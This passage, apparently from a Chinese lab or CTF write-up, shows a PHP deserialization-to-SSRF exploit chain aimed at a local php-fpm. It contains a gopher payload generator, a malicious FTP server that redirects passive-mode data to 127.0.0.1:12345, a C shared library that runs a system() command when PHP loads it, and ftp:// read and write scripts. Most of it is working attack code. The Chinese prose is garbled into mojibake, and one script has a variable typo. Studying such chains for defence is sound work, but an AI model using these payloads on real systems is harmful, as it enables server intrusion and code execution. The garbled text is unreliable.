&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_RETURNTRANSFER&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">curl_exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">curl_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$result&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__destruct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">curl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_COOKIE&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;login&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#d88200">&amp;#39;1&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_COOKIE&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;crawldata&amp;#34;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;url&amp;#34;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$crl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Crawl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;url&amp;#34;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;no&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç”¨pç‰›è„šæœ¬ç”Ÿæˆpayloadï¼Œç›´æ¥ssrfä¼ªåè®®å¥½åƒä¹Ÿè¡Œï¼Ÿæ²¡ç¯å¢ƒï¼Œäº‘ä¸€ä¸‹äº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Crawl&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;gopher://127.0.0.1:9001/_xxxxxxxx&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// $a -&amp;gt; url = &amp;#34;dict://127.0.0.1:80/info&amp;#34;;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// $a -&amp;gt; url = &amp;#34;file:///proc/net/arp&amp;#34;;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å°†åºåˆ—åŒ–ä¹‹åçš„ç»“æœä¼ å…¥crawldata&lt;/p>
&lt;h3 id="ç»“åˆftppasv-modeæ”»å‡»æœ¬åœ°php-fpm">ç»“åˆftp&amp;amp;PASV modeæ”»å‡»æœ¬åœ°php-fpm&lt;/h3>
&lt;h4 id="ftpä½¿ç”¨pasvæ¨¡å¼è½¬å‘ftp-data">ftpä½¿ç”¨PASVæ¨¡å¼è½¬å‘ftp-data&lt;/h4>
&lt;p>å…ˆç®€å•æµ‹è¯•ftpè¿æ¥è¿›è¡ŒæŠ“åŒ…&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112195819783.png" alt="image-20211112195819783">&lt;/p>
&lt;p>å…¶ä¸­çš„&lt;code>227 Entering Passive Mode (192,168,187,3,230,20)&lt;/code>çš„æ‹¬å·å†…çš„å†…å®¹è¡¨ç¤ºçš„æ˜¯ä¼ è¾“çš„FTP-DATAæ‰“å‘çš„ä½ç½®ï¼Œå‰ä¸€éƒ¨åˆ†æ˜¯ipï¼Œç«¯å£æ˜¯230*256+20=58900&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112200459682.png" alt="image-20211112200459682">&lt;/p>
&lt;p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ–‡ä»¶å†…å®¹æ˜¯150okä¹‹åæ‰è¢«ä¼ å‡ºå»çš„ï¼Œè€Œä¸”ä¼šè¢«æ”¾åœ¨FTP-DATAä¸­è¢«ä¸Šä¼ å’Œä¸‹è½½&lt;/p>
&lt;p>æˆ‘ä»¬å¯ä»¥æ¨¡æ‹Ÿä¸€ä¸ªftp-serverï¼Œåœ¨å“åº”PASVå‘½ä»¤ï¼ˆå³passive åˆ‡æ¢è¢«åŠ¨æ¨¡å¼ï¼‰æ—¶è¿”å›&lt;code>(127,0,0,1,0,12345)&lt;/code>æ¥è®©FTP-DATAæ‰“å‘å†…ç½‘12345ç«¯å£ï¼›è¿™æ˜¯ä¸€ä¸ªæ¶æ„ftp-server&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 192.168.187.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">socket&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] listening ...........&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">AF_INET&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">SOCK_STREAM&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">bind&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">9999&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">addr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">accept&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;220 (vsFTPd 3.0.3)&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;331 Please specify the password.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;230 Login successful.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;215 UNIX Type: L8&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;200 Switching to Binary mode.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;227 Entering Passive Mode (127,0,0,1,0,12345).&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;150 Ok to send data.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># sending payload .....&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;226 Transfer complete.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0xff&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;221 Goodbye.&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] completed ~~&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>åœ¨å¦ä¸€å°192.168.187.3ä¸Šè®¿é—®è¿™ä¸ªæ¶æ„æœåŠ¡ï¼ŒæœŸé—´ä¼ è¾“çš„æ–‡ä»¶å°±ä¼šè¢«è½¬å‘åˆ°192.168.187.3è‡ªå·±çš„12345ç«¯å£&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112233757565.png" alt="image-20211112233757565">&lt;/p>
&lt;h4 id="phpåŠ è½½æ¶æ„soæ–‡ä»¶">phpåŠ è½½æ¶æ„.soæ–‡ä»¶&lt;/h4>
&lt;p>ä¿®æ”¹php.ini /etc/php/7.4/cli/php.ini&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">[PHP]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">extension&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">/home/amelia/TEMP/fpm/wuhu.so&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Cæºç &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define _GNU_SOURCE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">__attribute__&lt;/span> &lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">__constructor__&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#111">preload&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;touch /home/amelia/TEMP/fpm/pwned&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç¼–è¯‘ä¸º.so&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gcc wuhu.c -o wuhu.so --shared -fPIC
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿è¡Œphpå³è§¦å‘æ¶æ„.so&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112162658685.png" alt="image-20211112162658685">&lt;/p>
&lt;h4 id="ä»¤phpä½¿ç”¨ftp">ä»¤phpä½¿ç”¨ftp://&lt;/h4>
&lt;p>/etc/php/7.4/cli/php.ini&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ini" data-lang="ini">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">allow_url_fopen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">On&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ftpè¯» æ³¨æ„åé¢çš„è·¯å¾„éƒ½éœ€è¦ç»å¯¹è·¯å¾„&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>php ftp_read.php &lt;span style="color:#d88200">&amp;#39;ftp://test:test@192.168.187.3/home/test/flag.txt&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112215002622.png" alt="image-20211112215002622">&lt;/p>
&lt;p>ftpå†™&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">$agrv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">]));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#75af00">ftp_write&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#d88200">&amp;#39;ftp://test:test@192.168.187.3/home/test/test.txt&amp;#39;&lt;/span> &lt;span style="color:#d88200">&amp;#39;hello, world&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112223440182.png" alt="image-20211112223440182">&lt;/p>
&lt;p>ä½†æ˜¯è¿™é‡Œä¸€ç›´æ˜¯å¯ä»¥æ–°å»ºæ–‡ä»¶ä½†æ˜¯å†™å…¥ä¸äº†ï¼Œè¯»å…¥çš„å‚æ•°2ä¸€ç›´æ˜¯int(0)ï¼Œæš‚æ—¶è¿˜æ²¡è§£å†³é—®é¢˜ï¼ˆä¸è¿‡ç”¨ä¸‹é¢é‚£ä¸ªå†™å…¥å¾ˆæ­£å¸¸â€¦â€¦&lt;/p>
&lt;p>è¦†ç›–å·²å­˜åœ¨æ–‡ä»¶&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$context&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">stream_context_create&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ftp&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;overwrite&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">)));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$context&lt;/span>&lt;span style="color:#111">));&lt;/span>
